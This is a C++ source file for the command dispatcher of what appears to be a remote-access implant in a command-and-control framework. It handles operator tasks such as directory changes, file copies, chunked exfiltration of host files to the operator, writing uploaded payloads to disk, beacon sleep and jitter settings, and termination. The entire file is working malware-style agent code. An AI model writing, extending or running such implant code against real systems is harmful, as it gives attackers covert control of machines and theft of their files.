#include "Commander.h"

Commander::Commander(Agent* a)
{
	this->agent = a;
}

void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacker)
{
	if (recvSize < 8)
		return;

	Packer* inPacker  = (Packer*)MemAllocLocal(sizeof(Packer));
	*inPacker = Packer( recv, recvSize );

	ULONG packerSize = inPacker->Unpack32();
	while ( packerSize + 4 > inPacker->GetDataSize())
	{	
		ULONG CommandId = inPacker->Unpack32();
		switch ( CommandId )
		{

		case COMMAND_CD:        
			this->CmdCd(CommandId, inPacker, outPacker); break;
	
		case COMMAND_CP:   
			this->CmdCp(CommandId, inPacker, outPacker); break;
		
		case COMMAND_DOWNLOAD:
			this->CmdDownload(CommandId, inPacker, outPacker); break;

		case COMMAND_DOWNLOAD_STATE:
			this->CmdDownloadState(CommandId, inPacker, outPacker); break;

		case COMMAND_PROFILE:
			this->CmdProfile(CommandId, inPacker, outPacker); break;

		case COMMAND_PWD:       
			this->CmdPwd(CommandId, inPacker, outPacker); break;
		
		case COMMAND_TERMINATE: 
			this->CmdTerminate(CommandId, inPacker, outPacker); break;
		
		case COMMAND_UPLOAD:
			this->CmdUpload(CommandId, inPacker, outPacker); break;

		case COMMAND_SAVEMEMORY:
			this->CmdSaveMemory(CommandId, inPacker, outPacker); break;

		default: break;
		}
	}

	MemFreeLocal((LPVOID*)&recv, recvSize);
}

void Commander::CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*) inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	BOOL result = ApiWin->SetCurrentDirectoryA(path);
	if (result) {
		CHAR  currentPath[MAX_PATH] = { 0 };
		ULONG currentPathSize = ApiWin->GetCurrentDirectoryA(MAX_PATH, currentPath);
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)currentPath, currentPathSize);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

void Commander::CmdCp(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG srcSize = 0;
	CHAR* src     = (CHAR*) inPacker->UnpackBytes(&srcSize);
	ULONG dstSize = 0;
	CHAR* dst     = (CHAR*) inPacker->UnpackBytes(&dstSize);
	ULONG taskId  = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	BOOL result = ApiWin->CopyFileA(src, dst, FALSE);
	if (result) {
		outPacker->Pack32(commandId);
	}      
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

void Commander::CmdDownload(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG filenameSize = 0;
	CHAR* filename     = (CHAR*) inPacker->UnpackBytes(&filenameSize);
	ULONG taskId       = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	HANDLE hFile = ApiWin->CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
	else {
		CHAR  fullPath[MAX_PATH];
		DWORD pathSize = ApiWin->GetFullPathNameA( filename, MAX_PATH, fullPath, NULL);
		DWORD fileSize = ApiWin->GetFileSize( hFile, 0 );

		if (pathSize > 0) {
			DownloadData downloadData = this->agent->downloader->CreateDownloadData(taskId, hFile, fileSize);
			outPacker->Pack32(COMMAND_DOWNLOAD);
			outPacker->Pack32(downloadData.fileId);
			outPacker->Pack8(DOWNLOAD_START);
			outPacker->Pack32(downloadData.fileSize);
			outPacker->PackBytes((PBYTE)fullPath, pathSize);
		}
		else {
			outPacker->Pack32(COMMAND_ERROR);
			outPacker->Pack32(TEB->LastErrorValue);
		}
	}
}

void Commander::CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG newState = inPacker->Unpack32();
	ULONG fileId   = inPacker->Unpack32();
	ULONG taskId   = inPacker->Unpack32();

	bool  found    = false;
	for (int i = 0; i < this->agent->downloader->downloads.size(); i++) {
		if (this->agent->downloader->downloads[i].fileId == fileId) {
			this->agent->downloader->downloads[i].state = newState;
			found = true;
			break;
		}
	}

	outPacker->Pack32(taskId);
	if (found) {
		outPacker->Pack32(COMMAND_DOWNLOAD_STATE);
		outPacker->Pack32(fileId);
		outPacker->Pack8((BYTE)newState);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(2);
	}
}

void Commander::CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG subcommand = inPacker->Unpack32();

	if (subcommand == 1) {
		ULONG sleep  = inPacker->Unpack32();
		ULONG jitter = inPacker->Unpack32();
		ULONG taskId = inPacker->Unpack32();

		agent->config->sleep_delay  = sleep;
		agent->config->jitter_delay = jitter;

		outPacker->Pack32(taskId);
		outPacker->Pack32(COMMAND_PROFILE);
		outPacker->Pack32(subcommand);
		outPacker->Pack32(agent->config->sleep_delay);
		outPacker->Pack32(agent->config->jitter_delay);
	} 
	else if (subcommand == 2) {
		ULONG size   = inPacker->Unpack32();
		ULONG taskId = inPacker->Unpack32();
		
		agent->downloader->chunkSize = size;

		outPacker->Pack32(taskId);
		outPacker->Pack32(COMMAND_PROFILE);
		outPacker->Pack32(subcommand);
		outPacker->Pack32(agent->downloader->chunkSize);
	}
}

void Commander::CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	CHAR  path[MAX_PATH] = { 0 };
	ULONG pathSize = ApiWin->GetCurrentDirectoryA(MAX_PATH, path);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	if (pathSize) {
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)path, pathSize);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

void Commander::CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	agent->config->exit_method  = inPacker->Unpack32();
	agent->config->exit_task_id = inPacker->Unpack32();
	agent->SetActive(false);
}

void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG memoryId = inPacker->Unpack32();
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();
	
	outPacker->Pack32(taskId);

	if ( !agent->memorysaver->chunks.contains(memoryId) )
		return;

	MemoryData memData = agent->memorysaver->chunks[memoryId];
	if (memData.complete) {

		bool  result  = false;
		DWORD written = 0;

		HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			result = ApiWin->WriteFile(hFile, memData.buffer, memData.totalSize, &written, NULL);

		if (result) {
			outPacker->Pack32(COMMAND_UPLOAD);
		}
		else {
			outPacker->Pack32(COMMAND_ERROR);
			outPacker->Pack32(TEB->LastErrorValue);
		}

		if (hFile) {
			ApiNt->NtClose(hFile);
			hFile = NULL;
		}
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(2);
	}
	agent->memorysaver->RemoveMemoryData(memoryId);
}



void Commander::CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG memoryId   = inPacker->Unpack32();
	ULONG totalSize  = inPacker->Unpack32();
	ULONG bufferSize = 0;
	BYTE* buffer     = inPacker->UnpackBytes(&bufferSize);
	ULONG taskId     = inPacker->Unpack32();

	this->agent->memorysaver->WriteMemoryData(memoryId, totalSize, bufferSize, buffer);
}

void Commander::Exit(Packer* outPacker)
{
	outPacker->Pack32(agent->config->exit_task_id);
	outPacker->Pack32(COMMAND_TERMINATE);
	outPacker->Pack32(agent->config->exit_method);
}